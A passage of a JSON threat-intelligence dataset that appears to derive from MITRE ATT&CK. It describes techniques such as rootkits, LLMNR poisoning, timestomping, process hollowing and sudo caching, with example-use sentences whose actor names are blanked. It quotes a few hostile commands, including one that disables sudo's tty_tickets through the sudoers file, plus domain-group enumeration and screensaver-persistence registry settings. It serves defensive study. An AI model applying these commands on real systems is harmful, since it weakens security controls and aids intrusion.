subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
    "example_uses": [
      "One variant of  locates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence."
    ],
    "id": "T1044",
    "name": "File System Permissions Weakness",
    "similar_words": [
      "File System Permissions Weakness"
    ]
  },
  "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0": {
    "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
    "example_uses": [
      "can sniff plaintext network credentials and use NBNS Spoofing to poison name services.",
      "is used to poison name services to gather hashes and credentials from systems within a local network."
    ],
    "id": "T1171",
    "name": "LLMNR/NBT-NS Poisoning",
    "similar_words": [
      "LLMNR/NBT-NS Poisoning and Relay"
    ]
  },
  "attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b": {
    "description": "Rootkits are programs that hide the existence of malware by intercepting (i.e., [Hooking](https://attack.mitre.org/techniques/T1179)) and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a [Hypervisor](https://attack.mitre.org/techniques/T1062), Master Boot Record, or the [System Firmware](https://attack.mitre.org/techniques/T1019). (Citation: Wikipedia Rootkit)\n\nAdversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",
    "example_uses": [
      "starts a rootkit from a malicious file dropped to disk.",
      "hides from defenders by hooking libc function calls, hiding artifacts that would reveal its presence, such as the user account it creates to provide access and undermining strace, a tool often used to identify malware.",
      "is a kernel-mode rootkit.",
      "is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.",
      "is a rootkit used by .",
      "is a rootkit that hides certain operating system artifacts.",
      "used a rootkit to modify typical server functionality."
    ],
    "id": "T1014",
    "name": "Rootkit",
    "similar_words": [
      "Rootkit"
    ]
  },
  "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967": {
    "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "example_uses": [
      "has modules that are capable of capturing audio.",
      "can perform audio capture.",
      "can record sound using input audio devices.",
      "can record the sounds from microphones on a computer.",
      "is capable of performing audio captures.",
      "Get-MicrophoneAudio Exfiltration module can record system microphone audio.",
      "has used an audio capturing utility known as SOUNDWAVE that captures microphone input.",
      "can record sound with the microphone.",
      "has the capability to capture audio from a victim machine.",
      "uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype.",
      "can record audio using any existing hardware recording devices.",
      "captured audio and sent it out to a C2 server."
    ],
    "id": "T1123",
    "name": "Audio Capture",
    "similar_words": [
      "Audio Capture"
    ]
  },
  "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d": {
    "description": "Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1028) can also be used externally.\n\nAdversaries may use remote services to access and persist within a network. (Citation: Volexity Virtual Private Keylogging) Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of [Redundant Access](https://attack.mitre.org/techniques/T1108) during an operation.",
    "example_uses": [
      "used VPNs and Outlook Web Access (OWA) to maintain access to victim networks.",
      "regained access after eviction via the corporate VPN solution with a stolen VPN certificate, which they had extracted from a compromised host.",
      "uses remote services such as VPN, Citrix, or OWA to persist in an environment.",
      "has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.",
      "actors look for and use VPN profiles during an operation to access the network using external VPN services.",
      "actors leverage legitimate credentials to log into external remote services."
    ],
    "id": "T1133",
    "name": "External Remote Services",
    "similar_words": [
      "External Remote Services"
    ]
  },
  "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44": {
    "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "example_uses": [
      "is known to have the capability to overwrite the firmware on hard drives from some manufacturers."
    ],
    "id": "T1109",
    "name": "Component Firmware",
    "similar_words": [
      "Component Firmware"
    ]
  },
  "attack-pattern--128c55d3-aeba-469f-bd3e-c8996ab4112a": {
    "description": "Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)",
    "example_uses": [
      "modifies the time of a file as specified by the control server.",
      "samples were timestomped by the authors by setting the PE timestamps to all zero values.  also has a built-in command to modify file times.",
      "For early  versions, the compilation timestamp was faked.",
      "can modify file or directory timestamps.",
      "can timestomp files on victims using a Web shell.",
      "After creating a new service for persistence,  sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.",
      "performs timestomping of a CAB file it creates.",
      "has a command to timestop a file or directory.",
      "has used scheduled task raw XML with a backdated timestamp of June 2, 2016.",
      "Many  samples were programmed using Borland Delphi, which will mangle the default PE compile timestamp of a file.",
      "has a command to set certain attributes such as creation/modification timestamps on files.",
      "modifies timestamps of all downloaded executables to match a randomly selected file created prior to 2013.",
      "has a command to conduct timestomping by setting a specified file’s timestamps to match those of a system file in the System32 directory.",
      "sets the timestamps of its dropper files to the last-access and last-write timestamps of a standard Windows library chosen on the system.",
      "will timestomp any files or payloads placed on a target machine to help them blend in.",
      "The  malware supports timestomping.",
      "Several  malware families use timestomping, including modifying the last write timestamp of a specified Registry key to a random date, as well as copying the timestamp for legitimate .exe files (such as calc.exe or mspaint.exe) to its dropped files.",
      "has performed timestomping on victim files."
    ],
    "id": "T1099",
    "name": "Timestomp",
    "similar_words": [
      "Timestomp"
    ]
  },
  "attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce": {
    "description": "Adversaries may attempt to find local system or domain-level groups and permissions settings. \n\n### Windows\n\nExamples of commands that can list groups are net group /domain and net localgroup using the [Net](https://attack.mitre.org/software/S0039) utility.\n\n### Mac\n\nOn Mac, this same thing can be accomplished with the dscacheutil -q group for the domain, or dscl . -list /Groups for local groups.\n\n### Linux\n\nOn Linux, local groups can be enumerated with the groups command and domain groups via the ldapsearch command.",
    "example_uses": [
      "used batch scripts to enumerate administrators in the environment.",
      "gathers information about local groups and members.",
      "collects lists of local accounts with administrative access, local group user accounts, and domain local groups with the commands net localgroup administrators, net localgroup users, and net localgroup /domain.",
      "has the capability to retrieve information about groups.",
      "can obtain the victim user name.",
      "has used net group /domain, net localgroup administrators, net group “domain admins” /domain, and net group “Exchange Trusted Subsystem” /domain to find group permission settings on a victim.",
      "may collect permission group information by running net group /domain or a series of other commands on a victim.",
      "has a tool that can enumerate the permissions associated with Windows groups.",
      "has checked for the local admin group domain admin group and Exchange Trusted Subsystem groups using the commands net group Exchange Trusted Subsystem /domain and net group domain admins /domain.",
      "specifically looks for Domain Admins, Power Users, and the Administrators groups within the domain and locally",
      "collects the group name of the logged-in user and sends it to the C2.",
      "has the capability to execute the command net localgroup administrators.",
      "Commands such as net group and net localgroup can be used in  to gather information about and manipulate groups.",
      "can be used to gather information on permission groups within a domain.",
      "actors used the following command following exploitation of a machine with  malware to list local groups: net localgroup administrator >> %temp%\\download",
      "performs discovery of permission groups net group /domain."
    ],
    "id": "T1069",
    "name": "Permission Groups Discovery",
    "similar_words": [
      "Permission Groups Discovery"
    ]
  },
  "attack-pattern--1608f3e1-598a-42f4-a01a-2e252e81728f": {
    "description": "Adversaries may target user email to collect sensitive information from a target.\n\nFiles containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.\n\nAdversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.\n\nSome adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.",
    "example_uses": [
      "accessed email accounts using Outlook Web Access.",
      "has collected .PST archives.",
      "searches through Outlook files and directories (e.g., inbox, sent, templates, drafts, archives, etc.).",
      "used a tool called MailSniper to search through the Exchange server mailboxes for keywords.",
      "has collected emails from victim Microsoft Exchange servers.",
      "searches recursively for Outlook personal storage tables (PST) files within user directories and sends them back to the C2 server.",
      "used a .NET tool to dump data from Microsoft Exchange mailboxes.",
      "can interact with a victim’s Outlook session and look through folders and emails.",
      "collects address book information from Outlook.",
      "Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.",
      "searches for Microsoft Outlook data files with extensions .pst and .ost for collection and exfiltration.",
      "contains a command to collect and exfiltrate emails from Outlook.",
      "uses two utilities, GETMAIL and MAPIGET, to steal email. GETMAIL extracts emails from archived Outlook .pst files, and MAPIGET steals email still on Exchange servers that has not yet been archived."
    ],
    "id": "T1114",
    "name": "Email Collection",
    "similar_words": [
      "Email Collection"
    ]
  },
  "attack-pattern--18d4ab39-12ed-4a16-9fdb-ae311bba4a0f": {
    "description": "During the boot process, macOS executes source /etc/rc.common, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.\n\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user (Citation: Methods of Mac Malware Persistence).",
    "example_uses": [
      "adds an entry to the rc.common file for persistence."
    ],
    "id": "T1163",
    "name": "Rc.common",
    "similar_words": [
      "Rc.common"
    ]
  },
  "attack-pattern--1b7ba276-eedc-4951-a762-0ceea2c030ec": {
    "description": "Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration.\n\nAdversaries may search connected removable media on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. Some adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.",
    "example_uses": [
      "copies files with certain extensions from USB devices to\na predefined directory.",
      "steals files based on an extension list if a USB drive is connected to the system.",
      "has a package that collects documents from any inserted USB sticks.",
      "searches for files on attached removable drives based on a predefined list of file extensions every five seconds.",
      "contains a module to collect data from removable drives.",
      "steals user files from removable media with file extensions and keywords that match a predefined list.",
      "searches for interesting files (either a default or customized set of file extensions) on removable media and copies them to a staging area. The default file types copied would include data copied to the drive by .",
      "contains a module that collects documents with certain extensions from removable media or fixed drives connected via USB.",
      "Once a removable media device is inserted back into the first victim,  collects data from it that was exfiltrated from a second victim.",
      "A  file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.",
      "An  backdoor may collect the entire contents of an inserted USB device."
    ],
    "id": "T1025",
    "name": "Data from Removable Media",
    "similar_words": [
      "Data from Removable Media"
    ]
  },
  "attack-pattern--1b84d551-6de8-4b96-9930-d177677c3b1d": {
    "description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)\n\nCode signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
    "example_uses": [
      "has signed  payloads with legally purchased code signing certificates.  has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.",
      "uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.",
      "Some  samples were signed with a stolen digital certificate.",
      "is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.",
      "A  .dll file is digitally signed by a certificate from AirVPN.",
      "The  client has been signed by fake and invalid digital certificates.",
      "has used stolen code signing certificates used to sign malware.",
      "is digitally signed by Microsoft.",
      "has signed its malware with an invalid digital certificates listed as “Tencent Technology (Shenzhen) Company Limited.”",
      "drops a signed Microsoft DLL to disk.",
      "digitally signed an executable with a stolen certificate from legitimate company AI Squared.",
      "versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"",
      "samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.",
      "used a valid AppleDeveloperID to sign the code to get past security restrictions.",
      "samples have been signed with a code-signing certificates.",
      "samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.",
      "has used valid digital certificates from Sysprint AG to sign its  dropper.",
      "stage 1 modules for 64-bit systems have been found to be signed with fake certificates masquerading as originating from Microsoft Corporation and Broadcom Corporation.",
      "used stolen certificates to sign its malware.",
      "has used stolen certificates to sign its malware.",
      "has used forged Microsoft code-signing certificates on malware.",
      "has used code-signing certificates on its malware that are either forged due to weak keys or stolen."
    ],
    "id": "T1116",
    "name": "Code Signing",
    "similar_words": [
      "Code Signing"
    ]
  },
  "attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21": {
    "description": "Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process Injection July 2017)",
    "example_uses": [
      "malware can use process hollowing to inject one of its trojans into another process.",
      "has used process hollowing in iexplore.exe to load the  implant.",
      "has been launched by starting iexplore.exe and replacing it with 's payload.",
      "Some  versions have an embedded DLL known as MockDll that uses process hollowing and  to execute another payload.",
      "spawns a new copy of c:\\windows\\syswow64\\explorer.exe and then replaces the executable code in memory with malware.",
      "can use process hollowing for execution.",
      "hollows out a newly created process RegASM.exe and injects its payload into the hollowed process.",
      "has a command to download an .exe and use process hollowing to inject it into a new process.",
      "has been seen loaded into msiexec.exe through process hollowing to hide its execution.",
      "is capable of loading executable code via process hollowing.",
      "A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe."
    ],
    "id": "T1093",
    "name": "Process Hollowing",
    "similar_words": [
      "Process Hollowing"
    ]
  },
  "attack-pattern--1ce03c65-5946-4ac9-9d4d-66db87e024bd": {
    "description": "Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).\n\nFor example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",
    "example_uses": [
      "has used the meek domain fronting plugin for Tor to hide the destination of C2 traffic.",
      "uses Domain Fronting to disguise the destination of network traffic as another server that is hosted in the same Content Delivery Network (CDN) as the intended desitnation."
    ],
    "id": "T1172",
    "name": "Domain Fronting",
    "similar_words": [
      "Domain Fronting"
    ]
  },
  "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d": {
    "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
    "example_uses": [
      "MISC::AddSid module can appended any SID or user/group account to a user's SID-History.  also utilizes  to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain."
    ],
    "id": "T1178",
    "name": "SID-History Injection",
    "similar_words": [
      "SID-History Injection"
    ]
  },
  "attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125": {
    "description": "A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in C:\\Windows\\System32 and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",
    "example_uses": [],
    "id": "T1013",
    "name": "Port Monitors",
    "similar_words": [
      "Port Monitors"
    ]
  },
  "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba": {
    "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons).",
    "example_uses": [
      "has sent emails with URLs pointing to malicious documents.",
      "has sent spearphising emails with malicious links to potential victims.",
      "used spearphishing with PDF attachments containing malicious links that redirected to credential harvesting websites.",
      "sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.",
      "attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.",
      "has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server.",
      "sent spear phishing emails containing links to .hta files.",
      "has distributed targeted emails containing links to malicious documents with embedded macros.",
      "has used spearphishing with links to deliver files with exploits to initial victims. The group has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.",
      "sent shortened URL links over email to victims. The URLs linked to Word documents with malicious macros that execute PowerShells scripts to download Pupy.",
      "has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",
      "has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files."
    ],
    "id": "T1192",
    "name": "Spearphishing Link",
    "similar_words": [
      "Spearphishing Link"
    ]
  },
  "attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302": {
    "description": "Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)\n\nAdversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: SubTee GitHub All The Things Application Whitelisting Bypass)",
    "example_uses": [],
    "id": "T1121",
    "name": "Regsvcs/Regasm",
    "similar_words": [
      "Regsvcs/Regasm"
    ]
  },
  "attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e": {
    "description": "The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout that is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nAdversaries can abuse poor configurations of this to escalate privileges without needing the user's password. /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. When tty_tickets is disabled, adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",
    "example_uses": [
      "modifies the tty_tickets line in the sudoers file."
    ],
    "id": "T1206",
    "name": "Sudo Caching",
    "similar_words": [
      "Sudo Caching"
    ]
  },
  "attack-pattern--241814ae-de3f-4656-b49e-f9a80764d4b7": {
    "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules, anti-virus, and virtualization. These checks may be built into early-stage remote access tools.\n\n### Windows\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), reg query with [Reg](https://attack.mitre.org/software/S0075), dir with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\n### Mac\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.",
    "example_uses": [
      "probes the system to check for sandbox/virtualized environments and other antimalware processes.",
      "attempts to detect several anti-virus products.",
      "enumerates running processes to search for Wireshark and Windows Sysinternals suite.",
      "uses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.",
      "can obtain information on installed anti-malware programs.",
      "uses WMI to check for anti-virus software installed on the system.",
      "checks for sandboxing libraries and debugging tools.",
      "performs several anti-VM and sandbox checks on the victim's machine.",
      "checks for anti-malware products and processes.",
      "installer searches the Registry and system to see if specific antivirus tools are installed on the system.",
      "checks for ant-sandboxing software such as virtual PC, sandboxie, and VMware.",
      "has detected security tools.",
      "has used Registry keys to detect and avoid executing in potential sandboxes.",
      "checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them.",
      "checks for processes associated with anti-virus vendors.",
      "may collect information the victim's anti-virus software.",
      "checks for the presence of Bitdefender security software.",
      "has the ability to identify any anti-virus installed on the infected system.",
      "can obtain information about security software on the victim.",
      "A module in  collects information from the victim about installed anti-virus software.",
      "checks for the existence of anti-virus.",
      "identifies security software such as antivirus through the Security module.",
      "The  crimeware toolkit has refined its detection of sandbox analysis environments by inspecting the process list and Registry.",
      "contains a command to collect information about anti-virus software on the victim.",
      "The main  dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit. Newer versions of  will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment. If it detects that it is, it will exit.",
      "has a plugin to detect active drivers of some security products.",
      "performs checks for various antivirus and security products during installation.",
      "has the ability to scan for security tools such as firewalls and antivirus tools.",
      "checks for anti-virus, forensics, and virtualization software.",
      "can be used to enumerate security software currently running on a system by process name of known products.",
      "can be used to discover system firewall settings.",
      "scanned the “Program Files” directories for a directory with the string “Total Security” (the installation path of the “360 Total Security” antivirus tool).",
      "uses commands such as netsh advfirewall firewall to discover local firewall settings."
    ],
    "id": "T1063",
    "name": "Security Software Discovery",
    "similar_words": [
      "Security Software Discovery"
    ]
  },
  "attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c": {
    "description": "Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1023) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1158). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)",
    "example_uses": [
      "has functionality to copy itself to network shares.",
      "copies itself into the public folder of Network Attached Storage (NAS) devices and infects new victims who open the file.",
      "uses a virus that propagates by infecting executables stored on shared drives."
    ],
    "id": "T1080",
    "name": "Taint Shared Content",
    "similar_words": [
      "Taint Shared Content"
    ]
  },
  "attack-pattern--2715c335-1bf2-4efe-9f18-0691317ff83b": {
    "description": "In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. (Citation: OS X Keychain) (Citation: External to DA, the OS X Way) Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. (Citation: OS X Keychain)\n\nIf an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS X Keychain) (Citation: OSX Keydnap malware)",
    "example_uses": [
      "uses the keychaindump project to read securityd memory."
    ],
    "id": "T1167",
    "name": "Securityd Memory",
    "similar_words": [
      "Securityd Memory"
    ]
  },
  "attack-pattern--2892b9ee-ca9f-4723-b332-0dc6e843a8ae": {
    "description": "Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. (Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.exe is located in C:\\Windows\\System32\\ along with screensavers included with base Windows installations. The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:\n\n* SCRNSAVE.exe - set to malicious PE path\n* ScreenSaveActive - set to '1' to enable the screensaver\n* ScreenSaverIsSecure - set to '0' to not require a password to unlock\n* ScreenSaverTimeout - sets user inactivity timeout before screensaver is executed\n\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)",
    "example_uses": [
      "can establish persistence through the system screensaver by configuring it to execute the malware."
    ],
    "id": "T1180",
    "name": "Screensaver",
    "similar_words": [
      "Screensaver"
    ]
  },
  "attack-pattern--2ba5aa71-9d15-4b22-b726-56af06d9ad2f": {
    "description": "Per Apple’s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items (Citation: Startup Items). This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, /Library/StartupItems isn’t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), StartupParameters.plist, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism (Citation: Methods of Mac Malware Persistence). Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.",
    "example_uses": [],
    "id": "T1165",
    "name": "Startup Items",
